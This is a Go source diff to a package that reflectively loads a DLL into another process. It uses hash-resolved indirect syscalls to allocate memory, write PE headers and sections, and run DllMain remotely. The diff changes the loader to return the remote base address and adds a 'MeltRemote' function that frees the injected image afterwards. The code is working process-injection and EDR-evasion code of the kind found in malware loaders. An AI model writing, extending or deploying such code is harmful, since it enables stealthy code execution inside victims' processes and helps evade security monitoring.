@@ -3,6 +3,7 @@ package pe
 import (
 	"encoding/binary"
 	"errors"
+	"fmt"
 	"strings"
 	"unicode/utf16"
 	"unsafe"
@@ -35,9 +36,9 @@ type moduleEntry32 struct {
 	szExePath     [260]uint16
 }
 
-func LoadDLLRemote(hProcess uintptr, dllBytes []byte) error {
+func LoadDLLRemote(hProcess uintptr, dllBytes []byte) (uintptr, error) {
 	if len(dllBytes) < 64 || dllBytes[0] != 'M' || dllBytes[1] != 'Z' {
-		return errors.New("invalid PE")
+		return 0, errors.New("invalid PE")
 	}
 
 	peOffset := *(*uint32)(unsafe.Pointer(&dllBytes[60]))
@@ -55,7 +56,7 @@ func LoadDLLRemote(hProcess uintptr, dllBytes []byte) error {
 		hProcess, uintptr(unsafe.Pointer(&remoteBase)), 0,
 		uintptr(unsafe.Pointer(&regionSize)), memCommit|memReserve, pageRW)
 	if ret != 0 || remoteBase == 0 {
-		return errors.New("NtAllocateVirtualMemory failed")
+		return 0, errors.New("NtAllocateVirtualMemory failed")
 	}
 
 	ntWrite := wc.GetSyscall(wc.GetHash("NtWriteVirtualMemory"))
@@ -64,7 +65,7 @@ func LoadDLLRemote(hProcess uintptr, dllBytes []byte) error {
 		hProcess, remoteBase, uintptr(unsafe.Pointer(&dllBytes[0])),
 		uintptr(sizeOfHeaders), uintptr(unsafe.Pointer(&written)))
 	if ret != 0 {
-		return errors.New("NtWriteVirtualMemory failed")
+		return 0, errors.New("NtWriteVirtualMemory failed")
 	}
 
 	numSections := *(*uint16)(unsafe.Pointer(peHeaderAddr + 0x06))
@@ -85,7 +86,7 @@ func LoadDLLRemote(hProcess uintptr, dllBytes []byte) error {
 			uintptr(unsafe.Pointer(&dllBytes[pointerToRawData])),
 			uintptr(sizeOfRawData), uintptr(unsafe.Pointer(&written)))
 		if ret != 0 {
-			return errors.New("NtWriteVirtualMemory section failed")
+			return 0, errors.New("NtWriteVirtualMemory section failed")
 		}
 	}
 
@@ -139,8 +140,30 @@ func LoadDLLRemote(hProcess uintptr, dllBytes []byte) error {
 		callDllMain(hProcess, remoteBase, remoteBase+uintptr(entryPointRVA))
 	}
 
+	return remoteBase, nil
+}
+
+func MeltRemote(hProcess uintptr, remoteBase uintptr) error {
+	if remoteBase == 0 {
+		return errors.New("nil remote base address")
+	}
+
+	ntFree := wc.GetSyscall(wc.GetHash("NtFreeVirtualMemory"))
+	var baseAddr uintptr = remoteBase
+	var regionSize uintptr = 0
+
+	ret, _ := wc.IndirectSyscall(ntFree.SSN, ntFree.Address,
+		hProcess,
+		uintptr(unsafe.Pointer(&baseAddr)),
+		uintptr(unsafe.Pointer(&regionSize)),
+		memRelease)
+	if ret != 0 {
+		return fmt.Errorf("NtFreeVirtualMemory failed: 0x%x", ret)
+	}
+
 	return nil
 }
+
 func uintptrToBytes(ptr uintptr) []byte {
 	ptrPtr := unsafe.Pointer(&ptr)
 
